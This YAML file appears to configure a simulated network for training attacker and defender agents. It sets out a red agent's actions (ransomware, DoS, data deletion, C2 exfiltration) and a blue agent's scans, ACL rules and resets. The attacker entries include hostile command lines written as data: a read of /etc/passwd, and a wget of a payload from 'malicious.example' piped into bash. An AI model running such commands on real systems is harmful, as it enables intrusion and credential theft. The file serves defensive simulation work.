version: 3.0

io_settings:
  save_agent_actions: false      # turned off to avoid serialising IPv4Address objects in logs
  save_step_metadata: false
  save_pcap_logs: false
  save_sys_logs: false
  sys_log_level: WARNING

game:
  max_episode_length: 128
  ports:
    - HTTP
    - POSTGRES_SERVER
  protocols:
    - ICMP
    - TCP
    - UDP
  thresholds:
    nmne:
      high: 10
      medium: 5
      low: 0

agents:
  - ref: client_2_green_user
    team: GREEN
    type: probabilistic-agent
    agent_settings:
      action_probabilities:
        0: 0.3
        1: 0.6
        2: 0.1

    action_space:
      action_map:
        0:
          action: do-nothing
          options: {}
        1:
          action: node-application-execute
          options:
            node_name: client_2
            application_name: web-browser
        2:
          action: node-application-execute
          options:
            node_name: client_2
            application_name: database-client

    reward_function:
      reward_components:
        - type: webpage-unavailable-penalty
          weight: 0.25
          options:
            node_hostname: client_2
        - type: green-admin-database-unreachable-penalty
          weight: 0.05
          options:
            node_hostname: client_2

  - ref: client_1_green_user
    team: GREEN
    type: probabilistic-agent
    agent_settings:
      action_probabilities:
        0: 0.3
        1: 0.6
        2: 0.1

    action_space:
      action_map:
        0:
          action: do-nothing
          options: {}
        1:
          action: node-application-execute
          options:
            node_name: client_1
            application_name: web-browser
        2:
          action: node-application-execute
          options:
            node_name: client_1
            application_name: database-client

    reward_function:
      reward_components:
        - type: webpage-unavailable-penalty
          weight: 0.25
          options:
            node_hostname: client_1
        - type: green-admin-database-unreachable-penalty
          weight: 0.05
          options:
            node_hostname: client_1

  - ref: attacker
    team: RED
    type: proxy-agent
    observation_space:
      type: custom
      options:
        components:
          - type: nodes
            label: NODES
            options:
              hosts:
                - hostname: domain_controller
                - hostname: web_server
                  services:
                    - service_name: web-server
                - hostname: database_server
                  folders:
                    - folder_name: database
                      files:
                        - file_name: database.db
                - hostname: backup_server
                - hostname: security_suite
                - hostname: client_1
                - hostname: client_2
                - hostname: c2_server
              num_services: 1
              num_applications: 0
              num_folders: 1
              num_files: 1
              num_nics: 2
              include_num_access: false
              include_nmne: true
              monitored_traffic:
                icmp:
                  - NONE
                tcp:
                  - DNS
              routers:
                - hostname: router_1
              num_ports: 0
              ip_list:
                - "192.168.1.10"
                - "192.168.1.12"
                - "192.168.1.14"
                - "192.168.1.16"
                - "192.168.1.110"
                - "192.168.10.21"
                - "192.168.10.22"
                - "192.168.10.110"
                - "192.168.10.200"
              wildcard_list:
                - 0.0.0.1
              port_list:
                - HTTP
                - POSTGRES_SERVER
                - 80
              protocol_list:
                - ICMP
                - TCP
                - UDP
              num_rules: 10

          - type: links
            label: LINKS
            options:
              link_references:
                - router_1:eth-1<->switch_1:eth-8
                - router_1:eth-2<->switch_2:eth-8
                - switch_1:eth-1<->domain_controller:eth-1
                - switch_1:eth-2<->web_server:eth-1
                - switch_1:eth-3<->database_server:eth-1
                - switch_1:eth-4<->backup_server:eth-1
                - switch_1:eth-7<->security_suite:eth-1
                - switch_2:eth-1<->client_1:eth-1
                - switch_2:eth-2<->client_2:eth-1
                - switch_2:eth-7<->security_suite:eth-2
          - type: "none"
            label: ICS
            options: {}
    reward_function:
      reward_components:
        - type: database-file-integrity
          weight: 1.0
          options:
            node_hostname: database_server
            folder_name: database
            file_name: database.db
            intact_reward: -0.1  
            deleted_penalty: 100.0 
        - type: action-penalty
          weight: 0.1
          options:
            per_action_penalty:
              do-nothing: -1.0
    agent_settings:
      flatten_obs: true
      action_masking: true
    action_space:
      action_map:
        0:
          action: do-nothing
          options: {}

        1:
          action: node-application-execute
          options:
            node_name: client_1
            application_name: data-manipulation-bot
        2:
          action: node-application-execute
          options:
            node_name: client_1
            application_name: dos-bot
        3:
          action: node-application-execute
          options:
            node_name: client_1
            application_name: ransomware-script
        # 4:
        #   action: node-application-execute
        #   options:
        #     node_name: client_1
        #     application_name: database-client
        # 6:
        #   action: node-application-execute
        #   options:
        #     node_name: client_1
        #     application_name: web-browser
        4:
          action: node-application-execute
          options:
            node_name: client_2
            application_name: data-manipulation-bot
        5:
          action: node-application-execute
          options:
            node_name: client_2
            application_name: dos-bot
        6:
          action: node-application-execute
          options:
            node_name: client_2
            application_name: ransomware-script
        # 11:
        #   action: node-application-execute
        #   options:
        #     node_name: client_2
        #     application_name: database-client
        # 12:
        #   action: node-application-execute
        #   options:
        #     node_name: client_2
        #     application_name: web-browser

        # 13:
        #   action: node-application-scan
        #   options:
        #     node_name: client_1
        #     application_name: web-browser

        # 14:
        #   action: node-service-scan
        #   options:
        #     node_name: web_server
        #     service_name: web-server

        # 15:
        #   action: node-file-scan
        #   options:
        #     node_name: database_server
        #     folder_name: database
        #     file_name: database.db

        # 16:
        #   action: node-folder-scan
        #   options:
        #     node_name: database_server
        #     folder_name: database

        # 17:
        #   action: node-os-scan
        #   options:
        #     node_name: domain_controller

        # 18:
        #   action: node-nmap-port-scan
        #   options:
        #     source_node: client_1
        #     target_ip_address: "192.168.1.12"
        #     show: false                # explicit boolean to avoid invalid tuple default in schema

        7:
          action: node-send-remote-command
          options:
            node_name: client_1
            remote_ip: "192.168.1.14"
            command: ["bash", "-lc", "cat /etc/passwd"]

        8:
          action: configure-ransomware-script
          options:
            node_name: client_1
            server_ip_address: "192.168.10.200"
            server_password: "c2pass"
            payload: "encrypt"

        9:
          action: configure-c2-beacon
          options:
            node_name: client_1
            c2_server_ip_address: "192.168.10.200"
            keep_alive_frequency: 10
            masquerade_protocol: tcp
            masquerade_port: 80

        10:
          action: configure-database-client
          options:
            node_name: client_1
            server_ip_address: "192.168.1.14"
            server_password: "db_pass"

        11:
          action: configure-dos-bot
          options:
            node_name: client_1
            target_ip_address: "192.168.1.12"
            target_port: POSTGRES_SERVER
            payload: "SPOOF DATA"
            repeat: False
            port_scan_p_of_success: 0.8
            dos_intensity: 1.0
            max_sessions: 500

        12:
          action: c2-server-ransomware-launch
          options:
            node_name: c2_server

        13:
          action: c2-server-terminal-command
          options:
            node_name: c2_server
            commands:
              - ["wget", "http://malicious.example/payload.sh", "-O", "/tmp/payload.sh"]
              - ["bash", "/tmp/payload.sh"]
            ip_address: "192.168.10.200"
            username: admin
            password: supersecret

        14:
          action: c2-server-data-exfiltrate
          options:
            node_name: c2_server
            target_ip_address: "192.168.10.21"
            target_file_name: secret.db
            target_folder_name: secrets
            exfiltration_folder_name: stolen
            username: user
            password: pass

        15:
          action: c2-server-ransomware-configure
          options:
            node_name: c2_server
            server_ip_address: "192.168.1.14"
            server_password: "c2pass"
            payload: "encrypt"

        16:
          action: node-file-corrupt
          options:
            node_name: database_server
            folder_name: database
            file_name: database.db

  - ref: defender
    team: BLUE
    type: proxy-agent

    observation_space:
      type: custom
      options:
        components:
          - type: nodes
            label: NODES
            options:
              hosts:
                - hostname: domain_controller
                - hostname: web_server
                  services:
                    - service_name: web-server
                - hostname: database_server
                  folders:
                    - folder_name: database
                      files:
                        - file_name: database.db
                - hostname: backup_server
                - hostname: security_suite
                - hostname: client_1
                - hostname: client_2
                - hostname: c2_server
              num_services: 1
              num_applications: 0
              num_folders: 1
              num_files: 1
              num_nics: 2
              include_num_access: false
              include_nmne: true
              monitored_traffic:
                icmp:
                  - NONE
                tcp:
                  - DNS
              routers:
                - hostname: router_1
              num_ports: 0
              ip_list:
                - "192.168.1.10"
                - "192.168.1.12"
                - "192.168.1.14"
                - "192.168.1.16"
                - "192.168.1.110"
                - "192.168.10.21"
                - "192.168.10.22"
                - "192.168.10.110"
                - "192.168.10.200"
              wildcard_list:
                - 0.0.0.1
              port_list:
                - HTTP
                - POSTGRES_SERVER
                - 80
              protocol_list:
                - ICMP
                - TCP
                - UDP
              num_rules: 10

          - type: links
            label: LINKS
            options:
              link_references:
                - router_1:eth-1<->switch_1:eth-8
                - router_1:eth-2<->switch_2:eth-8
                - switch_1:eth-1<->domain_controller:eth-1
                - switch_1:eth-2<->web_server:eth-1
                - switch_1:eth-3<->database_server:eth-1
                - switch_1:eth-4<->backup_server:eth-1
                - switch_1:eth-7<->security_suite:eth-1
                - switch_2:eth-1<->client_1:eth-1
                - switch_2:eth-2<->client_2:eth-1
                - switch_2:eth-7<->security_suite:eth-2
          - type: "none"
            label: ICS
            options: {}

    action_space:
      action_map:
        0:
          action: do-nothing
          options: {}
        1:
          action: node-service-scan
          options:
            node_name: web_server
            service_name: web-server
        2:
          action: node-service-stop
          options:
            node_name: web_server
            service_name: web-server
        3:
          action: node-service-start
          options:
            node_name: web_server
            service_name: web-server
        4:
          action: node-service-pause
          options:
            node_name: web_server
            service_name: web-server
        5:
          action: node-service-resume
          options:
            node_name: web_server
            service_name: web-server
        6:
          action: node-service-restart
          options:
            node_name: web_server
            service_name: web-server
        7:
          action: node-service-disable
          options:
            node_name: web_server
            service_name: web-server
        8:
          action: node-service-enable
          options:
            node_name: web_server
            service_name: web-server
        9:
          action: node-file-scan
          options:
            node_name: database_server
            folder_name: database
            file_name: database.db
        10:
          action: node-file-scan
          options:
            node_name: database_server
            folder_name: database
            file_name: database.db
        11:
          action: node-file-delete
          options:
            node_name: database_server
            folder_name: database
            file_name: database.db
        12:
          action: node-file-repair
          options:
            node_name: database_server
            folder_name: database
            file_name: database.db
        13:
          action: node-service-fix
          options:
            node_name: database_server
            service_name: database-service
        14:
          action: node-folder-scan
          options:
            node_name: database_server
            folder_name: database
        15:
          action: node-folder-scan
          options:
            node_name: database_server
            folder_name: database
        16:
          action: node-folder-repair
          options:
            node_name: database_server
            folder_name: database
        17:
          action: node-folder-restore
          options:
            node_name: database_server
            folder_name: database
        18:
          action: node-os-scan
          options:
            node_name: domain_controller
        19:
          action: node-shutdown
          options:
            node_name: domain_controller
        20:
          action: node-startup
          options:
            node_name: domain_controller
        21:
          action: node-reset
          options:
            node_name: domain_controller
        22:
          action: node-os-scan
          options:
            node_name: web_server
        23:
          action: node-shutdown
          options:
            node_name: web_server
        24:
          action: node-startup
          options:
            node_name: web_server
        25:
          action: node-reset
          options:
            node_name: web_server
        26:
          action: node-os-scan
          options:
            node_name: database_server
        27:
          action: node-shutdown
          options:
            node_name: database_server
        28:
          action: node-startup
          options:
            node_name: database_server
        29:
          action: node-reset
          options:
            node_name: database_server
        30:
          action: node-os-scan
          options:
            node_name: backup_server
        31:
          action: node-shutdown
          options:
            node_name: backup_server
        32:
          action: node-startup
          options:
            node_name: backup_server
        33:
          action: node-reset
          options:
            node_name: backup_server
        34:
          action: node-os-scan
          options:
            node_name: security_suite
        35:
          action: node-shutdown
          options:
            node_name: security_suite
        36:
          action: node-startup
          options:
            node_name: security_suite
        37:
          action: node-reset
          options:
            node_name: security_suite
        38:
          action: node-os-scan
          options:
            node_name: client_1
        39:
          action: node-shutdown
          options:
            node_name: client_1
        40:
          action: node-startup
          options:
            node_name: client_1
        41:
          action: node-reset
          options:
            node_name: client_1
        42:
          action: node-os-scan
          options:
            node_name: client_2
        43:
          action: node-shutdown
          options:
            node_name: client_2
        44:
          action: node-startup
          options:
            node_name: client_2
        45:
          action: node-reset
          options:
            node_name: client_2
        46:
          action: router-acl-add-rule
          options:
            target_router: router_1
            position: 0
            permission: DENY
            src_ip: 192.168.10.21
            dst_ip: ALL
            src_port: ALL
            dst_port: ALL
            protocol_name: ALL
            src_wildcard: NONE
            dst_wildcard: NONE
        47:
          action: router-acl-add-rule
          options:
            target_router: router_1
            position: 1
            permission: DENY
            src_ip: 192.168.10.22
            dst_ip: ALL
            src_port: ALL
            dst_port: ALL
            protocol_name: ALL
            src_wildcard: NONE
            dst_wildcard: NONE
        48:
          action: router-acl-add-rule
          options:
            target_router: router_1
            position: 2
            permission: DENY
            src_ip: 192.168.10.21
            dst_ip: 192.168.1.12
            src_port: ALL
            dst_port: ALL
            protocol_name: TCP
            src_wildcard: NONE
            dst_wildcard: NONE
        49:
          action: router-acl-add-rule
          options:
            target_router: router_1
            position: 3
            permission: DENY
            src_ip: 192.168.10.22
            dst_ip: 192.168.1.12
            src_port: ALL
            dst_port: ALL
            protocol_name: TCP
            src_wildcard: NONE
            dst_wildcard: NONE
        50:
          action: router-acl-add-rule
          options:
            target_router: router_1
            position: 4
            permission: DENY
            src_ip: 192.168.10.21
            dst_ip: 192.168.1.14
            src_port: ALL
            dst_port: ALL
            protocol_name: TCP
            src_wildcard: NONE
            dst_wildcard: NONE
        51:
          action: router-acl-add-rule
          options:
            target_router: router_1
            position: 5
            permission: DENY
            src_ip: 192.168.10.22
            dst_ip: 192.168.1.14
            src_port: ALL
            dst_port: ALL
            protocol_name: TCP
            src_wildcard: NONE
            dst_wildcard: NONE
        52:
          action: router-acl-remove-rule
          options:
            target_router: router_1
            position: 0
        53:
          action: router-acl-remove-rule
          options:
            target_router: router_1
            position: 1
        54:
          action: router-acl-remove-rule
          options:
            target_router: router_1
            position: 2
        55:
          action: router-acl-remove-rule
          options:
            target_router: router_1
            position: 3
        56:
          action: router-acl-remove-rule
          options:
            target_router: router_1
            position: 4
        57:
          action: router-acl-remove-rule
          options:
            target_router: router_1
            position: 5
        58:
          action: router-acl-remove-rule
          options:
            target_router: router_1
            position: 6
        59:
          action: router-acl-remove-rule
          options:
            target_router: router_1
            position: 7
        60:
          action: router-acl-remove-rule
          options:
            target_router: router_1
            position: 8
        61:
          action: router-acl-remove-rule
          options:
            target_router: router_1
            position: 9
        62:
          action: host-nic-disable
          options:
            node_name: domain_controller
            nic_num: 1
        63:
          action: host-nic-enable
          options:
            node_name: domain_controller
            nic_num: 1
        64:
          action: host-nic-disable
          options:
            node_name: web_server
            nic_num: 1
        65:
          action: host-nic-enable
          options:
            node_name: web_server
            nic_num: 1
        66:
          action: host-nic-disable
          options:
            node_name: database_server
            nic_num: 1
        67:
          action: host-nic-enable
          options:
            node_name: database_server
            nic_num: 1
        68:
          action: host-nic-disable
          options:
            node_name: backup_server
            nic_num: 1
        69:
          action: host-nic-enable
          options:
            node_name: backup_server
            nic_num: 1
        70:
          action: host-nic-disable
          options:
            node_name: security_suite
            nic_num: 1
        71:
          action: host-nic-enable
          options:
            node_name: security_suite
            nic_num: 1
        72:
          action: host-nic-disable
          options:
            node_name: security_suite
            nic_num: 2
        73:
          action: host-nic-enable
          options:
            node_name: security_suite
            nic_num: 2
        74:
          action: host-nic-disable
          options:
            node_name: client_1
            nic_num: 1
        75:
          action: host-nic-enable
          options:
            node_name: client_1
            nic_num: 1
        76:
          action: host-nic-disable
          options:
            node_name: client_2
            nic_num: 1
        77:
          action: host-nic-enable
          options:
            node_name: client_2
            nic_num: 1
        78:
          action: node-application-scan
          options:
            node_name: client_1
            application_name: web-browser
        79:
          action: node-application-scan
          options:
            node_name: client_2
            application_name: web-browser
        80:
          action: node-application-close
          options:
            node_name: client_1
            application_name: data-manipulation-bot
        81:
          action: node-application-close
          options:
            node_name: client_2
            application_name: data-manipulation-bot
        82:
          action: router-acl-add-rule
          options:
            target_router: router_1
            position: 6
            permission: DENY
            src_ip: 192.168.10.21
            dst_ip: ALL
            src_port: ALL
            dst_port: ALL
            protocol_name: ALL
            src_wildcard: NONE
            dst_wildcard: NONE
        83:
          action: router-acl-add-rule
          options:
            target_router: router_1
            position: 7
            permission: DENY
            src_ip: 192.168.10.22
            dst_ip: ALL
            src_port: ALL
            dst_port: ALL
            protocol_name: ALL
            src_wildcard: NONE
            dst_wildcard: NONE

    reward_function:
      reward_components:
        - type: database-file-integrity
          weight: 1.0
          options:
            node_hostname: database_server
            folder_name: database
            file_name: database.db
            intact_reward: 0.0
            deleted_penalty: -10.0

        - type: webpage-unavailable-penalty
          weight: 0.25
          options:
            node_hostname: web_server
            penalty: -0.1

        - type: green-admin-database-unreachable-penalty
          weight: 0.2
          options:
            node_hostname: database_server
            penalty: -0.1

        - type: action-penalty
          weight: 0.5
          options:
            per_action_penalty:
              node-file-corrupt: -0.5
              node-shutdown: -0.5
              node-application-stop: -0.1

        - type: shared-reward
          weight: 0.5
          options:
            agent_name: client_1_green_user

        - type: shared-reward
          weight: 0.5
          options:
            agent_name: client_2_green_user

    agent_settings:
      flatten_obs: true
      action_masking: true

simulation:
  network:
    nmne_config:
      capture_nmne: true
      nmne_capture_keywords:
        - DELETE
    nodes:
      - hostname: router_1
        type: router
        num_ports: 5
        ports:
          1:
            ip_address: "192.168.1.1"
            subnet_mask: 255.255.255.0
          2:
            ip_address: "192.168.10.1"
            subnet_mask: 255.255.255.0
        acl:
          18:
            action: PERMIT
            src_port: POSTGRES_SERVER
            dst_port: POSTGRES_SERVER
          19:
            action: PERMIT
            src_port: DNS
            dst_port: DNS
          20:
            action: PERMIT
            src_port: FTP
            dst_port: FTP
          21:
            action: PERMIT
            src_port: HTTP
            dst_port: HTTP
          22:
            action: PERMIT
            src_port: ARP
            dst_port: ARP
          23:
            action: PERMIT
            protocol: ICMP

      - hostname: switch_1
        type: switch
        num_ports: 8

      - hostname: switch_2
        type: switch
        num_ports: 8

      - hostname: domain_controller
        type: server
        ip_address: "192.168.1.10"
        subnet_mask: 255.255.255.0
        default_gateway: "192.168.1.1"
        services:
          - type: dns-server
            options:
              domain_mapping:
                arcd.com: "192.168.1.12"

      - hostname: web_server
        type: server
        ip_address: "192.168.1.12"
        subnet_mask: 255.255.255.0
        default_gateway: "192.168.1.1"
        dns_server: "192.168.1.10"
        services:
          - type: web-server
        applications:
          - type: database-client
            options:
              db_server_ip: "192.168.1.14"

      - hostname: database_server
        type: server
        ip_address: "192.168.1.14"
        subnet_mask: 255.255.255.0
        default_gateway: "192.168.1.1"
        dns_server: "192.168.1.10"
        services:
          - type: database-service
            options:
              backup_server_ip: "192.168.1.16"
          - type: ftp-client

      - hostname: backup_server
        type: server
        ip_address: "192.168.1.16"
        subnet_mask: 255.255.255.0
        default_gateway: "192.168.1.1"
        dns_server: "192.168.1.10"
        services:
          - type: ftp-server

      - hostname: security_suite
        type: server
        ip_address: "192.168.1.110"
        subnet_mask: 255.255.255.0
        default_gateway: "192.168.1.1"
        dns_server: "192.168.1.10"
        network_interfaces:
          2:
            ip_address: "192.168.10.110"
            subnet_mask: 255.255.255.0

      - hostname: client_1
        type: computer
        ip_address: "192.168.10.21"
        subnet_mask: 255.255.255.0
        default_gateway: "192.168.10.1"
        dns_server: "192.168.1.10"
        applications:
          - type: data-manipulation-bot
            options:
              server_ip: "192.168.1.14"
              payload: "DELETE"
              port_scan_p_of_success: 0.8
              data_manipulation_p_of_success: 0.8
          - type: dos-bot
            options:
              target_ip_address: "192.168.1.14"
              payload: "SPOOF DATA"
              repeat: False
              port_scan_p_of_success: 0.8
              dos_intensity: 1.0
              max_sessions: 1000
          - type: ransomware-script
            options:
              server_ip: "192.168.1.14"
          - type: c2-beacon
            options:
              c2_server_ip_address: "192.168.10.200"
              keep_alive_frequency: 5
              masquerade_protocol: tcp
              masquerade_port: 80
          - type: web-browser
            options:
              target_url: "http://arcd.com/users/"
          - type: database-client
            options:
              db_server_ip: "192.168.1.14"
        services:
          - type: dns-client

      - hostname: client_2
        type: computer
        ip_address: "192.168.10.22"
        subnet_mask: 255.255.255.0
        default_gateway: "192.168.10.1"
        dns_server: "192.168.1.10"
        applications:
          - type: web-browser
            options:
              target_url: "http://arcd.com/users/"
          - type: data-manipulation-bot
            options:
              server_ip: "192.168.1.14"
              payload: "DELETE"
              port_scan_p_of_success: 0.8
              data_manipulation_p_of_success: 0.8
          - type: dos-bot
            options:
              target_ip_address: "192.168.1.14"
              payload: "SPOOF DATA"
              repeat: False
              port_scan_p_of_success: 0.8
              dos_intensity: 1.0
              max_sessions: 1000
          - type: ransomware-script
            options:
              server_ip: "192.168.1.14"
          - type: c2-beacon
            options:
              c2_server_ip_address: "192.168.10.200"
              keep_alive_frequency: 5
              masquerade_protocol: tcp
              masquerade_port: 80
          - type: database-client
            options:
              db_server_ip: "192.168.1.14"
        services:
          - type: dns-client

      - hostname: c2_server
        type: server
        ip_address: "192.168.10.200"
        subnet_mask: 255.255.255.0
        default_gateway: "192.168.10.1"
        dns_server: "192.168.1.10"
        applications:
          - type: c2-server
            options: {}

    links:
      - endpoint_a_hostname: router_1
        endpoint_a_port: 1
        endpoint_b_hostname: switch_1
        endpoint_b_port: 8
      - endpoint_a_hostname: router_1
        endpoint_a_port: 2
        endpoint_b_hostname: switch_2
        endpoint_b_port: 8
      - endpoint_a_hostname: switch_1
        endpoint_a_port: 1
        endpoint_b_hostname: domain_controller
        endpoint_b_port: 1
      - endpoint_a_hostname: switch_1
        endpoint_a_port: 2
        endpoint_b_hostname: web_server
        endpoint_b_port: 1
      - endpoint_a_hostname: switch_1
        endpoint_a_port: 3
        endpoint_b_hostname: database_server
        endpoint_b_port: 1
      - endpoint_a_hostname: switch_1
        endpoint_a_port: 4
        endpoint_b_hostname: backup_server
        endpoint_b_port: 1
      - endpoint_a_hostname: switch_1
        endpoint_a_port: 7
        endpoint_b_hostname: security_suite
        endpoint_b_port: 1
      - endpoint_a_hostname: switch_2
        endpoint_a_port: 1
        endpoint_b_hostname: client_1
        endpoint_b_port: 1
      - endpoint_a_hostname: switch_2
        endpoint_a_port: 2
        endpoint_b_hostname: client_2
        endpoint_b_port: 1
      - endpoint_a_hostname: switch_2
        endpoint_a_port: 7
        endpoint_b_hostname: security_suite
        endpoint_b_port: 2
